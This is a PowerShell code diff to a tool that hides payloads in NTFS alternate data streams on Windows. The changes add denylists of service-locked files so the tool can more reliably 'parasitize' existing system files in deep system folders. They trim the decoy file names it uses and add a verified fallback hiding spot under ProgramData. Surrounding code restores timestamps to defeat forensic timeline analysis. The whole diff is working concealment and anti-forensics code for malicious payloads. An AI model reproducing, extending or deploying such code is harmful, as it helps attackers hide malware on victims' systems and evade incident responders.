@@ -686,6 +686,14 @@ function Get-RandomADSConfig {
 
     $_isWin = [bool]$env:ProgramData
 
+    # Denylist: files held open exclusively by Windows services.
+    # ADS writes to these will fail silently. See docs/research/deep-placement-denylist.md.
+    $script:LockedFileDenylist = @('qmgr.db','qmgr.dat','srudb.dat','WebCacheV01.dat',
+                                   'DataStore.edb','priv1.edb','Windows.edb','PerfStringBackup.INI')
+    $script:LockedExtDenylist = @('.edb','.etl')
+    # Directories owned by services that lock files aggressively
+    $script:LockedDirPatterns = @('Network\Downloader','System32\sru','Search\Data')
+
     if ($_isWin -and ($UseDeepPlacement -or $AttachToExisting)) {
         # Running directly on Windows — resolve deep path now
         $deepDirs = @(
@@ -695,18 +703,28 @@ function Get-RandomADSConfig {
             "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
             "$env:WINDIR\Temp",
             "$env:ProgramData\Microsoft\Diagnosis",
-            "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics",
-            "$env:ProgramData\Microsoft\Network\Downloader"
+            "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics"
         )
 
         $validDirs = $deepDirs | Where-Object { Test-Path $_ }
 
         if ($AttachToExisting -and $validDirs) {
-            # Find an existing file to parasitize
+            # Find an existing file to parasitize (skip known-locked files)
             $hostPath = $null
             foreach ($dir in ($validDirs | Get-Random -Count ([Math]::Min(3, $validDirs.Count)))) {
+                # Skip directories owned by services that lock files aggressively
+                $isDeniedDir = $false
+                foreach ($dp in $script:LockedDirPatterns) {
+                    if ($dir -like "*$dp*") { $isDeniedDir = $true; break }
+                }
+                if ($isDeniedDir) { continue }
+
                 $candidate = Get-ChildItem -Path $dir -File -ErrorAction SilentlyContinue |
-                    Where-Object { $_.Length -gt 0 -and $_.Length -lt 5MB } |
+                    Where-Object {
+                        $_.Length -gt 0 -and $_.Length -lt 5MB -and
+                        $_.Name -notin $script:LockedFileDenylist -and
+                        $_.Extension -notin $script:LockedExtDenylist
+                    } |
                     Select-Object -First 10 | Get-Random
                 if ($candidate) {
                     $hostPath = $candidate.FullName
@@ -726,8 +744,7 @@ function Get-RandomADSConfig {
             $targetDir = $validDirs | Get-Random
             if ($targetDir) {
                 $legitNames = @('Report.wer','etl_data.log','WPR_initiated.dat',
-                                'snapshot.etl','diag_report.xml','cache_entry.dat',
-                                'qmgr0.dat','aria-debug.log','session.etl')
+                                'diag_report.xml','cache_entry.dat','aria-debug.log')
                 $fileName = if ($Randomize) { $legitNames | Get-Random } else { 'cache_entry.dat' }
                 $hostPath = Join-Path $targetDir $fileName
             }
@@ -833,7 +850,28 @@ function Write-ADSPayload {
 
         # Write to ADS
         $adsPath = "$HostPath`:$StreamName"
-        $finalPayload | Set-Content -Path $adsPath -Force
+        $finalPayload | Set-Content -Path $adsPath -Force -ErrorAction SilentlyContinue
+
+        # Post-write verification — never trust silent failures
+        $verifyStream = Get-Item $HostPath -Stream $StreamName -ErrorAction SilentlyContinue
+        if (-not $verifyStream) {
+            Write-Warning "ADS write failed on $HostPath — falling back to safe path"
+            # Fallback to a known-writable location
+            $fallbackPath = Join-Path $env:ProgramData ("cache_" + [guid]::NewGuid().ToString().Substring(0,8) + ".dat")
+            if (-not (Test-Path $fallbackPath)) {
+                New-Item -Path $fallbackPath -ItemType File -Force | Out-Null
+            }
+            $adsPath = "$fallbackPath`:$StreamName"
+            $finalPayload | Set-Content -Path $adsPath -Force
+            # Verify fallback write
+            $verifyFallback = Get-Item $fallbackPath -Stream $StreamName -ErrorAction SilentlyContinue
+            if (-not $verifyFallback) {
+                Write-Error "ADS write failed on fallback path $fallbackPath"
+                return $null
+            }
+            $HostPath = $fallbackPath
+            Write-Verbose "Fallback ADS written to: $adsPath"
+        }
 
         # Restore timestamps — ADS creation modifies LastWriteTime, which
         # creates a forensic artifact in timeline analysis. Restoring prevents
